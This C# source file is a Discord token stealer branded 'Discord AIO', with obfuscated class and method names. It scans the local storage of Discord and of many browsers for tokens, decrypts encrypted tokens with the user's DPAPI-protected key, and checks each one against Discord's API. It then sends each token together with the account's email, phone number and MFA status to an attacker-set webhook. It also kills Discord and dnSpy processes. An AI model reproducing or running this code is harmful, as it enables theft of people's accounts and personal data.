using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Windows.Forms;
using System.Linq.Expressions;

namespace ETHJkVsHyuUcWuMC
{
    internal class Program
    {
        internal static List<string> Tokens = new List<string>();
        static async Task Main()
        {
            Tokens = await hproejah.ngsodfa();
            await IGhtean.aher(Tokens);
        }
    }

    internal static class hproejah
    {
        internal static string LocalDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        internal static string RoamingDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        internal static List<string> Tokens = new List<string>();
        internal static List<string> dcP = new List<string>
        {
            $"{LocalDir}\\discord\\",
            $"{RoamingDir}\\Discord\\",
            $"{RoamingDir}\\Lightcord\\",
            $"{RoamingDir}\\discordptb\\",
            $"{RoamingDir}\\discordcanary\\",
        };
        internal static List<string> Paths = new List<string>()
        {
            String.Format("{0}/Discord/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/discord/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/Lightcord/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/discordcanary/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/discordptb/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/OperaSoftware/Opera GX Stable/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/OperaSoftware/Opera Stable/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb", RoamingDir),
            String.Format("{0}/Google/Chrome/User Data/Default/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Google/Chrome SxS/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Amigo/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Torch/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Kometa/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Orbitum/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/CentBrowser/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/7Star/7Star/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Sputnik/Sputnik/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Vivaldi/User Data/Default/Local Storage/leveldb", LocalDir),
            String.Format("{0}/EpicPrivacy Browser/User Data/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Microsoft/Edge/User Data/Default/Local Storage/leveldb", LocalDir),
            String.Format("{0}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb", LocalDir),
            String.Format("{0}/Iridium/User Data/Default/Local Storage/leveld", LocalDir),
        }, Regexs = new List<string>()
        {
            "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}",
            "mfa\\.[\\w-]{84}"
        }, RegexsEnc = new List<string>() { "dQw4w9WgXcQ:[^\\\"]*" };
        public static async Task<List<string>> ngsodfa()
        {
            foreach (var path in Paths)
            {
                if (Directory.Exists(path))
                    foreach (var file in new DirectoryInfo(path).GetFiles())
                    {
                        try
                        {
                            foreach (string regex in Regexs)
                            {
                                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), regex))
                                {
                                    if (!Tokens.Contains(match.Value))
                                        if (await xjhbpaer(match.Value))
                                            Tokens.Add(match.Value);
                                }
                            }
                            foreach (string regex in RegexsEnc)
                            {
                                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), regex))
                                {
                                    if (!Tokens.Contains(match.Value))
                                    {
                                        byte[] decrypted_key = key(RoamingDir + "\\discord\\Local State");
                                        string prefixedValue = match.Value;
                                        string token = aehrearhher(Convert.FromBase64String(prefixedValue.Split(':')[1]), decrypted_key);
                                        if (await xjhbpaer(token))
                                            if (!Tokens.Contains(token))
                                                Tokens.Add(token);
                                    }
                                }
                            }
                        }
                        catch { }
                    }
            }

            return Tokens;
        }

        public static async Task<bool> xjhbpaer(string token)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    ServicePointManager.Expect100Continue = true;
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");

                    HttpResponseMessage response = await client.GetAsync("https://discordapp.com/api/v9/users/@me");

                    if (response.IsSuccessStatusCode)
                    {
                        string resp = await response.Content.ReadAsStringAsync();
                        if (resp.Contains("{\"id\":\"") || resp.Contains("\",\"username\":\"")) return true;
                    }
                    return false;
                }
            }
            catch { throw; }
        }

        public static void ahtehe()
        {
            List<string> Instances = new List<string> { "DiscordDevelopment", "DiscordPTB", "Lightcord", "Discord", "discord", "dnspy" };
            Instances.ForEach(proc =>
            {
                foreach (var process in Process.GetProcessesByName(proc))
                {
                    try { process.Kill(); } catch { };
                }
            });
        }

        public static byte[] key(string path)
        {
            try
            {
                string keyPlain = File.ReadAllText(path);
                string keySelected = getBetween(keyPlain, "key\":\"", "\"}}");

                byte[] keyBytes = Convert.FromBase64String(keySelected).Slice(5);
                byte[] keyDecrypted = System.Security.Cryptography.ProtectedData.Unprotect(keyBytes, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                return keyDecrypted;
            }
            catch
            {
                return null;
            }
        }

        public static string aehrearhher(byte[] x, byte[] key)
        {
            try
            {
                byte[] iv = x.Slice(3, 12);
                byte[] payload = x.Slice(15);
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
                cipher.Init(false, parameters);
                byte[] decrypted = new byte[cipher.GetOutputSize(payload.Length)];
                int len = cipher.ProcessBytes(payload, 0, payload.Length, decrypted, 0);
                cipher.DoFinal(decrypted, len);
                return Encoding.UTF8.GetString(decrypted);
            }
            catch
            {
                return null;
            }
        }


        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int Start, End;
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            return "";
        }

        public static string RemovePrefix(this string s, int prefixLen)
        {
            if (s.Length < prefixLen)
            {
                return string.Empty;
            }
            return s.Remove(0, prefixLen);
        }
    }

    public static class ByteArrayExtensions
    {
        public static byte[] Slice(this byte[] source, int start, int length)
        {
            byte[] slice = new byte[length];
            Array.Copy(source, start, slice, 0, length);
            return slice;
        }

        public static byte[] Slice(this byte[] source, int start)
        {
            return source.Slice(start, source.Length - start);
        }
    }

    internal class IGhtean
    {
        private static readonly string rqrq = "%WEBHOOK%";
        public static async Task aher(List<string> Tokens)
        {
            var tasks = Tokens.Select(token => xxxxx(token)).ToList();
            await Task.WhenAll(tasks);
        }

        public static async Task xxxxx(string pqte)
        {
            string url = "https://discordapp.com/api/users/@me";
            string cbgf = "";

            using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("Authorization", pqte);
                HttpResponseMessage response = await client.GetAsync(url);

                if (response.IsSuccessStatusCode)
                    cbgf = await response.Content.ReadAsStringAsync();
            }

            string ID = hproejah.getBetween(cbgf, "id\":\"", "\",");
            string nD = hproejah.getBetween(cbgf, "global_name\":\"", "\",");
            string eM = hproejah.getBetween(cbgf, "email\":\"", "\",");
            string pH = hproejah.getBetween(cbgf, "phone\":\"", "\",");
            string mF = hproejah.getBetween(cbgf, "mfa_enabled\":", ",");
            string aV = hproejah.getBetween(cbgf, "avatar\":\"", "\",");
            string pM = hproejah.getBetween(cbgf, "premium_type\":", ",");
            string lO = hproejah.getBetween(cbgf, "locale\":\"", "\",");
            string bI = hproejah.getBetween(cbgf, "bio\":\"", "\",");

            nD = nD.Trim('"'); ID = ID.Trim('"'); eM = eM.Trim('"'); pH = pH.Trim('"'); aV = aV.Trim('"'); lO = lO.Trim('"'); bI = bI.Trim('"');

            if (pH == "null")
                pH = "❌";
            else
                pH = "**" + pH + "**";

            if (mF == "true")
                mF = "✔️";
            else
                mF = "❌";

            if (pM == "0")
                pM = "❌";
            else if (pM == "1")
                pM = "✔️ Nitro Basic";
            else
                pM = "✔️ Nitro Boosted";

            lO = ":flag_" + lO + ":";

            try
            {
                HttpClient cli = new HttpClient();
                cli.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

                var content = (@"{
            ""embeds"": [
              {
                ""title"": ""**Discord AIO**"",
                ""description"": ""```\n ```\n> Username: **{0}**\n> User ID: **{1}**\n> E-mail address: **{2}**\n> Phone number: {3}\n> Nitro: {4}\n> MFA: {5}\n> Nationality: {6}\n\n> Token: ```{7}```\n```\n ```\n> About:\n```{8}\n```\n"",
                ""color"": 393130,
                ""footer"": {
                  ""text"": ""Discord AIO - github.com/szajjch/Discord-AIO"",
                  ""icon_url"": ""https://i.imgur.com/YF07iWn.png""
                },
                ""thumbnail"": {
                  ""url"": ""https://cdn.discordapp.com/avatars/{1}/{9}.jpg""
                }
              }
            ], ""username"": ""New report"", ""avatar_url"": ""https://i.imgur.com/YF07iWn.png""}").Replace("{0}", nD).Replace("{1}", ID).Replace("{2}", eM).Replace("{3}", pH).Replace("{4}", pM).Replace("{5}", mF).Replace("{6}", lO).Replace("{7}", pqte).Replace("{8}", bI).Replace("{9}", aV);

                var data = new StringContent(content, Encoding.UTF8, "application/json");
                var response = await cli.PostAsync(rqrq, data);
            }
            catch { }
        }
    }
}
